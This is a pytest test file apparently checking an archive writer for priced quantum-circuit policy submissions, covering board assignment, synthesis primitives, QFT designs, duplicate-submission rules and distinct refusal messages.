    # Fails if BOARDS_OF is dropped and every policy is read as the PhaseProduct pair: a PhaseTripleProduct policy does
    # not enter the full order-finding board at all, so its primitive entry names ["ptp"] and claims no full-run row.
    checkout = plain(tmp_path)
    assert put(checkout, ptp()) is True
    assert put(checkout, ptp(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2, primitive=B3) is True
    assert entry_of(checkout, HEAD2)["boards"] == ["ptp"] and entry_of(checkout, HEAD2)["primitive"] == B3
    assert "boards" not in entry_of(checkout, HEAD), "the legacy PhaseTripleProduct entry is read, not rewritten"


def test_an_unknown_primitive_or_design_is_refused_and_writes_nothing(tmp_path):
    # Fails if write_policy accepts a primitive name or a design body without asking the planner, which is the only
    # check of either (the same arrangement as for the readout).
    checkout = plain(tmp_path)
    for kw, why in ((dict(primitive="catalytic-b2"), "unknown synthesis primitive"),      # the selector label, not the attested name
                    (dict(primitive="rossSelinger"), "unknown synthesis primitive"),      # the default is no key, never a value
                    (dict(design={}), "unknown QFT design"),
                    (dict(design={"data": "approximate"}), "unknown QFT design"),
                    (dict(design=["data"]), "unknown QFT design")):
        with pytest.raises(ap.ArchiveRefused, match=why):
            put(checkout, **kw)
    assert ap.read_index(checkout)["policies"] == [] and not (checkout / ap.DIR).exists()


def test_a_primitive_on_the_full_order_finding_board_is_refused(tmp_path):
    # Fails if the planner stops checking the board a result kind is archived for. `primitive_overlay` refuses the full
    # board by name ("a standalone primitive is priced on the PhaseProduct and PhaseTripleProduct boards only"); an
    # archive row claiming a full-run primitive would outlive that refusal.
    checkout = plain(tmp_path)
    v = verification()
    v["board"] = "full"
    with pytest.raises(ap.ArchiveRefused, match="cannot be archived for the 'full' board"):
        put(checkout, v, primitive=B2)
    assert ap.read_index(checkout)["policies"] == [] and not (checkout / ap.DIR).exists()


def test_the_same_head_priced_as_a_different_result_is_refused_not_a_no_op(remote):
    # Fails if the idempotency check still compares only the source, the digest and the summary: a readout, a primitive
    # and a design all leave those three identical, so re-running one head with a different result silently returned
    # "already archived" and kept the first entry.
    bare, clone = remote
    first = archive(clone, primitive=B2)
    assert archive(clone, primitive=B2)["added"] is False, "the exact retry is still a no-op"
    before = tip(bare)
    for kw in (dict(primitive=B3), dict(primitive=None), dict(primitive=B2, design=CATALYTIC),
               dict(primitive=B2, readout="semiclassical")):
        with pytest.raises(ap.ArchiveRefused, match="already archived as a different result"):
            archive(clone, **kw)
    assert tip(bare) == before == first["commit"], "nothing was pushed, and the first entry still stands"
    assert entry_of(clone, HEAD)["primitive"] == B2


def test_another_participants_primitive_is_its_own_result_and_only_identified(remote):
    # Fails if the generalised variant rule reaches other participants: DUPLICATE_RULES must keep deciding for them,
    # and their primitive-bearing submission is its own primitive, never a variant of a policy they do not own.
    bare, clone = remote
    archive(clone)
    got = archive(clone, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2,
                  login="other", primitive=B3)
    assert got["added"] is True
    assert [(d["policyId"], d["sameParticipant"]) for d in got["duplicates"]] == [(HEAD, False)]
    entry = entry_of(clone, HEAD2)
    assert entry["boards"] == ["pp", "full"] and entry["primitive"] == B3 and entry["tKind"] == "expectedAdaptive"


def test_an_entry_may_never_carry_a_bare_price_or_a_contradicted_T_kind():
    # Fails if check_entry is dropped or stops being called from write_policy. This is the archive's own refusal to be
    # the place the distinction is lost: a bare number a reader could rank without its kind, or a primitive recorded
    # with the other primitive's kind of T.
    for bare in ap.BARE_PRICE_KEYS:
        with pytest.raises(ap.ArchiveRefused, match="never the number"):
            ap.check_entry({"policy_id": HEAD, "primitive": B3, "tKind": "expectedAdaptive", bare: 143366613})
    for primitive, wrong in ((B3, "deterministic"), (B2, "expectedAdaptive"), (B2, None)):
        with pytest.raises(ap.ArchiveRefused, match="never the same claim"):
            ap.check_entry({"policy_id": HEAD, "primitive": primitive, "tKind": wrong})
    assert ap.check_entry({"policy_id": HEAD})["policy_id"] == HEAD, "a legacy entry passes unchanged"


# ---- the QFT design: the archive is the only place that can say WHICH design produced a row

def test_a_design_bearing_entry_names_the_design_because_nothing_else_records_it(tmp_path):
    # Fails if write_policy drops the `design` key. `mapping.row_of` copies no design key and the published row's
    # field set is closed with no field for one -- an unrecognised key is rejected, not ignored
    # (`SITE_ROW_FIELDS` in export_v2/pytests/test_design_price_plumbing.py) -- while `mapping.ranked_price_of` now
    # ranks the projection's own T and qubits, so without this key a design-bearing result is recorded nowhere at all.
    checkout = plain(tmp_path)
    assert put(checkout, design={"work": CATALYTIC["data"], "data": BANDED["data"]}) is True
    entry = entry_of(checkout, HEAD)
    assert list(entry["design"]) == ["data", "work"], "the families are recorded in a stable order"
    assert entry["design"]["data"] == BANDED["data"] and entry["boards"] == ["pp", "full"]
    assert "primitive" not in entry and entry["readout"] == "coherent"


@pytest.mark.parametrize("first,second", [(None, BANDED), (BANDED, None), (BANDED, CATALYTIC)])
def test_your_own_policy_with_another_qft_design_is_a_full_only_variant(first, second, tmp_path):
    # Fails if the design is left out of the planner's comparison: two designs of one policy would be refused as
    # repeats of each other, and a design would be invisible to the variant rule that divides the boards.
    checkout = plain(tmp_path)
    assert put(checkout, design=first) is True
    assert put(checkout, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2,
               design=second) is True
    variant = entry_of(checkout, HEAD2)
    assert variant.get("design") == second
    assert variant["boards"] == ["full"], "a QFT design re-prices the full run, at mapping.DESIGN_DELTA, and nothing else"


def test_the_same_policy_with_the_same_design_is_still_a_repeat(tmp_path):
    # Fails if the design comparison is by identity or by presence rather than by value.
    checkout = plain(tmp_path)
    put(checkout, design=BANDED)
    before = (checkout / ap.INDEX_PATH).read_bytes()
    with pytest.raises(ap.DuplicatePolicy, match="already submitted"):
        put(checkout, verification(SOURCE2), head=HEAD2, source=SOURCE2, design=dict(BANDED))
    assert (checkout / ap.INDEX_PATH).read_bytes() == before, "the refused repeat wrote nothing"


def test_a_result_that_reprices_no_board_of_this_policy_is_refused(tmp_path):
    # Fails if the empty-boards guard is dropped: a readout or a design re-prices the full order-finding run, which a
    # PhaseTripleProduct policy does not enter, so such an entry would be written claiming its own board, or `boards:
    # []` -- a row claiming no board at all. Refused with and without an earlier entry to be a variant of.
    for kw in (dict(design=BANDED), dict(readout="semiclassical")):
        checkout = plain(tmp_path, f"ptp-{len(kw)}{list(kw)[0]}")
        with pytest.raises(ap.ArchiveRefused, match="re-prices no board of a 'ptp' policy"):
            put(checkout, ptp(), **kw)
        assert ap.read_index(checkout)["policies"] == [] and not (checkout / ap.DIR).exists()
        put(checkout, ptp())
        with pytest.raises(ap.ArchiveRefused, match="re-prices no board of a 'ptp' policy"):
            put(checkout, ptp(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2, **kw)
        assert [p["policy_id"] for p in ap.read_index(checkout)["policies"]] == [HEAD]


# --- C20 / C21: two archive checks raised byte-identical messages -------------------------------
# The two checks are C20 and C21 above. Nothing below changes which
# submissions are archived or refused; only the reason says which check refused.

def test_a_summary_rule_says_which_copy_of_the_file_it_read(remote):
    # Production change that would fail this: dropping either parenthetical from the two
    # summary_tex.problem call sites (github_summary and check_summary). The same three messages
    # ("empty", the size limit, the UTF-8/control-character rules) are raised once for GitHub's copy
    # at the head commit and once when the verification is cross-checked against it. An operator
    # cannot otherwise tell a bad file in the pull request from a verification that carries a
    # different one. Census C20.
    _, clone = remote
    bad = "  \n"
    with pytest.raises(ap.ArchiveRefused) as cross_check:
        archive(clone, with_summary(bad), summary=bad)
    fetched = {"type": "file", "encoding": "base64", "content": base64.encodebytes(bad.encode()).decode()}
    with pytest.raises(ap.ArchiveRefused) as at_head:
        ap.github_summary(HEAD, "tok", lambda url, token, payload=None: fetched)
    for refused in (cross_check, at_head):
        assert "empty" in str(refused.value), str(refused.value)          # the anchor: summary_tex's own message
    assert str(cross_check.value) != str(at_head.value)
    assert "head commit" in str(at_head.value) and "cross-checking" in str(cross_check.value)


def test_the_duplicate_refusal_says_which_check_found_the_repeat(remote):
    # Production change that would fail this: dropping DuplicatePolicy's `source` argument, or
    # passing the same label from both sites. The readout variant planner and the writer's own
    # duplicate rules raised a byte-identical message, and the planner's refusal is sometimes caught
    # as control flow, so an operator could not tell where the repeat was found. Census C21.
    _, clone = remote
    archive(clone)
    # The writer's own rule, reached only when a repeat by ANOTHER participant is set to refuse: the same participant's
    # repeat is found earlier, by the planner, which is exactly the distinction this patch makes visible.
    with pytest.raises(ap.DuplicatePolicy) as writer:
        with pytest.MonkeyPatch.context() as patch:
            patch.setitem(ap.DUPLICATE_RULES, "other_participant", "refuse")
            archive(clone, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2,
                    login="other")
    with pytest.raises(ap.DuplicatePolicy) as planner:
        archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2)
    for refused in (writer, planner):
        assert "already submitted this exact policy" in str(refused.value), str(refused.value)   # the anchor
    assert str(writer.value) != str(planner.value)
    assert planner.value.source == "the readout variant planner", "the same participant's repeat is found by the planner"
    assert "writing the entry" in writer.value.source
    # The source must be IN the message, not only on the exception: the CLI reports str(e) as the reason
    # (intake_v2.py's duplicate arm), so an operator reading a refused run sees only the text.
    for refused in (writer, planner):
        assert refused.value.source in str(refused.value), str(refused.value)
    # Two repeats that differ only in which check found them must not read the same, which is the collision itself.
    same = {"policyId": HEAD, "login": "tester", "pull": 7, "createdAt": "2026-11-08T10:00:00Z", "sameParticipant": True}
    assert str(ap.DuplicatePolicy(same, "the readout variant planner")) != str(ap.DuplicatePolicy(same))


def test_the_duplicate_rules_still_refuse_and_accept_exactly_what_they_did(remote):
    # Production change that would fail this: letting the `source` argument change the duplicate
    # decision rather than only the reason. The same participant repeating a policy is still
    # refused, another participant is still archived with the repeat recorded, and
    # plan_readout_variant still returns (rather than raises) for the other readout.
    bare, clone = remote
    archive(clone)
    before = tip(bare)
    with pytest.raises(ap.DuplicatePolicy):
        archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2)
    assert tip(bare) == before, "nothing was pushed"
    index = archived_entry({"policies": []})
    assert ap.plan_readout_variant(index, digest="d" * 16, login="tester", head_sha=HEAD, mode="pair",
                                   readout="semiclassical", published_ids={"ef" * 20}) == "ef" * 20
